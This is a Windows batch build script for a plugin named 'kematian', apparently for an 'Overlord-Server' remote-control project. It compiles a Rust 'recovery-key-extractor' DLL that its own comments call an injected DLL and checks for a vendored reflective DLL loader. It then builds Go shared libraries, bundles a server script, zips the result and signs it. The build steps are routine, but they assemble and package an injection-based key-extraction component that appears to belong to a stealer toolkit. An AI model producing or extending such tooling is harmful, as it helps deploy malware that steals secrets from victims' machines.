@echo off
setlocal enabledelayedexpansion

set "GOWORK=off"

set "PLUGIN_DIR=%~dp0"
set "NATIVE_DIR=%PLUGIN_DIR%native"
set "PLUGIN_NAME=kematian"
set "ZIP_OUT=%PLUGIN_DIR%%PLUGIN_NAME%.zip"
set "INJECTION_DIR=%PLUGIN_DIR%vendor\injection"

if not exist "%NATIVE_DIR%" (
  echo [error] native folder not found: %NATIVE_DIR%
  exit /b 1
)

if not exist "%INJECTION_DIR%\ReflectiveLoader.c" (
  echo [error] vendor\injection missing - expected ReflectiveLoader.c
  exit /b 1
)

REM ── Build recovery-key-extractor.dll (Rust injected DLL) ─────────────────
REM Output must live next to platform/embedded_dll.go (go:embed resolution).
set "EXTRACTOR_OUT=%NATIVE_DIR%\recovery\platform\recovery-key-extractor.dll"
set "RUST_DIR=%PLUGIN_DIR%rust-extractor"
set "RUST_DLL=%RUST_DIR%\target\x86_64-pc-windows-gnu\release\recovery_key_extractor.dll"

echo [build] recovery-key-extractor.dll (Rust)
if not exist "%RUST_DIR%\Cargo.toml" (
  echo [error] rust-extractor\Cargo.toml not found
  exit /b 1
)
pushd "%RUST_DIR%"
cargo build --release --target x86_64-pc-windows-gnu
if errorlevel 1 (
  popd
  echo [error] cargo build failed
  exit /b 1
)
popd
copy /y "%RUST_DLL%" "%EXTRACTOR_OUT%" >nul
if errorlevel 1 (
  echo [error] failed to copy Rust DLL to %EXTRACTOR_OUT%
  exit /b 1
)
echo [ok] %EXTRACTOR_OUT%

pushd "%NATIVE_DIR%"

if not defined BUILD_TARGETS set "BUILD_TARGETS=windows-amd64"

for %%T in (%BUILD_TARGETS%) do (
  for /f "tokens=1,2 delims=-" %%A in ("%%T") do (
    set "TARGET_OS=%%A"
    set "TARGET_ARCH=%%B"
  )

  if "!TARGET_OS!"=="windows" (
    set "EXT=dll"
  ) else if "!TARGET_OS!"=="darwin" (
    set "EXT=dylib"
  ) else (
    set "EXT=so"
  )

  set "OUTFILE=%PLUGIN_DIR%%PLUGIN_NAME%-!TARGET_OS!-!TARGET_ARCH!.!EXT!"
  if exist "!OUTFILE!" del /f /q "!OUTFILE!"
  if exist "!OUTFILE:.dll=.h!" del /f /q "!OUTFILE:.dll=.h!"
  if exist "!OUTFILE:.dylib=.h!" del /f /q "!OUTFILE:.dylib=.h!"
  if exist "!OUTFILE:.so=.h!" del /f /q "!OUTFILE:.so=.h!"
  echo [build] GOOS=!TARGET_OS! GOARCH=!TARGET_ARCH! ^> !OUTFILE!
  set "GOOS=!TARGET_OS!"
  set "GOARCH=!TARGET_ARCH!"
  set "CGO_ENABLED=1"
  go build -buildmode=c-shared -o "!OUTFILE!" .
  if errorlevel 1 (
    echo [error] build failed for !TARGET_OS!-!TARGET_ARCH!
    popd
    exit /b 1
  )
)

set "GOOS="
set "GOARCH="
set "CGO_ENABLED="

popd

REM ── Bundle server.js with dependencies ──────────────────────────────────
echo [build] bundling server.js dependencies
pushd "%PLUGIN_DIR%"
if not exist "node_modules" (
  bun install --frozen-lockfile 2>nul || bun install
)
bun build ./server.src.js --outfile ./server.js --target node --external bun:sqlite
if errorlevel 1 (
  echo [error] server.js bundle failed
  popd
  exit /b 1
)
popd
echo [ok] server.js (bundled)

if exist "%ZIP_OUT%" del /f /q "%ZIP_OUT%"

set "ZIP_SOURCES="
for %%T in (%BUILD_TARGETS%) do (
  for /f "tokens=1,2 delims=-" %%A in ("%%T") do (
    set "TARGET_OS=%%A"
    set "TARGET_ARCH=%%B"
  )
  if "!TARGET_OS!"=="windows" (
    set "ZIP_SOURCES=!ZIP_SOURCES!,'%PLUGIN_DIR%%PLUGIN_NAME%-!TARGET_OS!-!TARGET_ARCH!.dll'"
  ) else if "!TARGET_OS!"=="darwin" (
    set "ZIP_SOURCES=!ZIP_SOURCES!,'%PLUGIN_DIR%%PLUGIN_NAME%-!TARGET_OS!-!TARGET_ARCH!.dylib'"
  ) else (
    set "ZIP_SOURCES=!ZIP_SOURCES!,'%PLUGIN_DIR%%PLUGIN_NAME%-!TARGET_OS!-!TARGET_ARCH!.so'"
  )
)

if exist "%PLUGIN_DIR%%PLUGIN_NAME%.html" set "ZIP_SOURCES=!ZIP_SOURCES!,'%PLUGIN_DIR%%PLUGIN_NAME%.html'"
if exist "%PLUGIN_DIR%%PLUGIN_NAME%.css"  set "ZIP_SOURCES=!ZIP_SOURCES!,'%PLUGIN_DIR%%PLUGIN_NAME%.css'"
if exist "%PLUGIN_DIR%%PLUGIN_NAME%.js"   set "ZIP_SOURCES=!ZIP_SOURCES!,'%PLUGIN_DIR%%PLUGIN_NAME%.js'"
if exist "%PLUGIN_DIR%config.json"        set "ZIP_SOURCES=!ZIP_SOURCES!,'%PLUGIN_DIR%config.json'"
if exist "%PLUGIN_DIR%server.js"          set "ZIP_SOURCES=!ZIP_SOURCES!,'%PLUGIN_DIR%server.js'"

set "ZIP_SOURCES=!ZIP_SOURCES:~1!"

powershell -NoProfile -Command "Compress-Archive -Path !ZIP_SOURCES! -DestinationPath '%ZIP_OUT%'"
if errorlevel 1 (
  echo [error] zip creation failed
  exit /b 1
)

if defined PLUGIN_SIGN_KEY (
  where bun >nul 2>&1
  if not errorlevel 1 (
    set "SIGN_SCRIPT=%PLUGIN_DIR%..\..\Overlord-Server\scripts\plugin-sign.ts"
    if exist "!SIGN_SCRIPT!" (
      echo [sign] Signing with key: %PLUGIN_SIGN_KEY%
      bun run "!SIGN_SCRIPT!" --key "%PLUGIN_SIGN_KEY%" "%ZIP_OUT%"
    ) else (
      echo [warn] plugin-sign.ts not found, skipping signing
    )
  ) else (
    echo [warn] bun not found, skipping signing
  )
)

echo [ok] %ZIP_OUT%
